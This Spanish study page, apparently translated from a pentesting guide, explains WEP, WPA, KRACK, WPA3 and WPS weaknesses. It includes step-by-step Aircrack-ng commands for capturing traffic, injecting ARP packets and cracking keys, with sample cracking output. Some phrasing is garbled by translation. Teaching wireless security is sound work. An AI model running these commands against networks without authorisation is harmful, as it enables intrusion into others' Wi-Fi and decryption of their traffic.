---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Ataques de vector de inicialización (IV) y protocolos inalámbricos no seguros

Un atacante puede provocar alguna modificación en el **vector de inicialización** (IV) de un paquete inalámbrico que se cifra durante la transmisión. El objetivo del atacante es obtener mucha información sobre el texto sin formato de un solo paquete y generar otra clave de cifrado que luego pueda usarse para descifrar otros paquetes usando el mismo IV. WEP es susceptible a muchos ataques diferentes, incluidos los ataques intravenosos.

## **Ataques contra WEP**

El WEP  se considera un protocolo inalámbrico obsoleto.

Las claves WEP existen en dos tamaños: claves de 40 bits (5 bytes) y 104 bits (13 bytes). Además, WEP utiliza un IV de 24 bits, que se antepone a la clave precompartida (PSK). Cuando configura un dispositivo de infraestructura inalámbrica con WEP, los IV se envían en texto sin formato.

WEP utiliza RC4 de una manera que permite a un atacante descifrar el PSK con poco esfuerzo. El problema está relacionado con cómo WEP utiliza los IV en cada paquete. Cuando WEP utiliza RC4 para cifrar un paquete, antepone el IV a la clave secreta antes de incluir la clave en RC4.Un atacante obtiene los primeros 3 bytes de una clave supuestamente "secreta" utilizada en cada paquete. Para recuperar el PSK, un atacante sólo necesita recopilar suficientes datos del aire. Un atacante puede acelerar este tipo de ataque simplemente inyectando paquetes ARP (porque la longitud es predecible), lo que le permite recuperar el PSK mucho más rápido. Después de recuperar la clave WEP, el atacante puede usarla para acceder a la red inalámbrica.

Un atacante también puede utilizar el conjunto de herramientas Aircrack-ng para descifrar (recuperar) la WEP PSK.&#x20;

_Uso de Airmon-ng para monitorear una red inalámbrica_

<pre class="language-bash"><code class="lang-bash"><strong>airmon-ng start wlan0 11 
</strong></code></pre>

La interfaz inalámbrica es **wlan0** y el canal inalámbrico seleccionado es **11** . Ahora el atacante quiere escuchar todas las comunicaciones dirigidas al BSSID **08:02:8E:D3:88:82**&#x20;

El comando escribe todo el tráfico en un archivo de captura llamado **omar\_capture.cap** . El atacante sólo tiene que especificar el prefijo del archivo de captura.

<pre><code><strong>airodump-ng -c 11 --bssid 08:02:8E:D3:88:82 -w omar_capture wlan0
</strong></code></pre>

El atacante puede usar Aireplay-ng para escuchar solicitudes ARP y luego reproducirlas o inyectar nuevamente en la red inalámbrica.

_Uso de Aireplay-ng para inyectar paquetes ARP_

<pre><code><strong>aireplay-ng -3 -b 08:02:8E:D3:88:82 -h 00:0F:B5:88:AC:82 wlan0
</strong></code></pre>

El atacante puede utilizar Aircrack-ng para descifrar la PSK WEP.

_Uso de **Aircrack-ng**_ _para descifrar WEP PSK_

<pre><code><strong>aircrack-ng -b 08:02:8E:D3:88:82 omar_capture.cap
</strong></code></pre>

Después de que Aircrack-ng crackea (recupera) la PSK WEP.

_**Ejemplo 5-20**_ _: WEP PSK crackeada (recuperada)_

```
                                 Aircrack-ng 0.9


                                 [00:02:12] Tested 924346 keys (got
99821 IVs)

 KB  depth byte(vote)
 0   0/ 9 12( 15) A9( 25) 47( 22) F7( 12) FE( 22) 1B( 5) 77( 3)
A5( 5) F6( 3) 02( 20)
 1     0/ 8 22( 11) A8( 27) E0( 24) 06( 18) 3B( 26) 4E( 15) E1( 13)
25( 15) 89( 12) E2( 12)
 2     0/ 2 32( 17) A6( 23) 15( 27) 02( 15) 6B( 25) E0( 15) AB( 13)
05( 14) 17( 11) 22( 10)
 3     1/ 5 46( 13) AA( 20) 9B( 20) 4B( 17) 4A( 26) 2B( 15) 4D( 13)
55( 15) 6A( 15) 7A( 15)


                        KEY FOUND! [ 56:7A:15:9E:A8 ]
      Decrypted correctly: 100%
```

## **Ataques contra WPA**

WPA y WPA versión 2 (WPA2) son susceptibles a diferentes vulnerabilidades. WPA versión 3 (WPA3) aborda todas las vulnerabilidades a las que son susceptibles WPA y WPA2, y muchos profesionales inalámbricos recomiendan WPA3 a organizaciones e individuos.

Todas las versiones de WPA admiten diferentes métodos de autenticación, incluido PSK. WPA no es susceptible a los ataques intravenosos que afectan a WEP;,es posible capturar el protocolo de enlace WPA de cuatro vías entre un cliente y un dispositivo de infraestructura inalámbrica y luego aplicar fuerza bruta al WPA PSK.

## **Cómo realizar este ataque utilizando el conjunto de herramientas Aircrack-ng.**

**Paso 1 **_**.**_ El atacante usa Airmon-ng para iniciar la interfaz inalámbrica en modo de monitoreo, usando el  comando **airmon-ng start wlan0 .**

**Paso 2 **_**.**_ Después de localizar la red corp-net, el atacante usa el  comando **airodump-ng** , para capturar todo el tráfico en un archivo de captura llamado  **wpa\_capture** , especificando el canal inalámbrico ( **11** ), el BSSID y la interfaz inalámbrica ( **wlan0** ).

```
airodump-ng --bssid 08:02:8E:D3:88:82 --channel 11 --write wpa_capture wlan0
```

**Paso 3.** El atacante utiliza el  comando **aircrack-ng**  para descifrar el WPA PSK utilizando una lista de palabras.

```
aircrack-ng -w words wpa_capture-02.cap
```

Después de descifrar el WPA PSK ,muestra el WPA PSK .

## **Ataques KRACK**

La explotación de estas vulnerabilidades depende de la configuración específica del dispositivo. Una explotación exitosa podría permitir a atacantes no autenticados reinstalar una clave de integridad o cifrado utilizada anteriormente (ya sea a través del cliente o del punto de acceso, según la vulnerabilidad específica). Cuando una clave utilizada anteriormente se ha reinstalado con éxito (mediante la explotación de las vulnerabilidades reveladas), un atacante puede proceder a capturar el tráfico utilizando la clave reinstalada e intentar descifrar dicho tráfico. Además, el atacante puede intentar falsificar o reproducir tráfico visto anteriormente. Un atacante puede realizar estas actividades manipulando las retransmisiones de mensajes de protocolo de enlace.

{% embed url="https://www.youtube.com/watch?v=Oh4WURZoR98" %}

## **Vulnerabilidades WPA3**

Varias vulnerabilidades pueden permitir que un atacante realice diferentes ataques de canal lateral, ataques de degradación y condiciones DoS.&#x20;

FragAttacks (que significa ataques de fragmentación y agregación) es otro tipo de vulnerabilidad que puede permitir a un atacante explotar WPA3.&#x20;

{% embed url="https://wpa3.mathyvanhoef.com/" %}

{% embed url="https://www.fragattacks.com/" %}

### **Ataques de PIN de configuración protegida Wi-Fi (WPS)**

La configuración protegida de Wi-Fi (WPS) es un protocolo que simplifica la implementación de redes inalámbricas. Está implementado para que los usuarios puedan simplemente generar un WPA PSK con poca interacción con un dispositivo inalámbrico. Normalmente, para aprovisionar el dispositivo inalámbrico se utiliza un PIN impreso en el exterior del dispositivo inalámbrico o en la caja que lo acompaña. A la mayoría de las implementaciones no les importa si intenta incorrectamente millones de combinaciones de PIN seguidas, lo que significa que estos dispositivos son susceptibles a ataques de fuerza bruta.

Una herramienta llamada Reaver hace que los ataques WPS sean muy simples y fáciles de ejecutar.&#x20;

{% embed url="https://github.com/t6x/reaver-wps-fork-t6x" %}
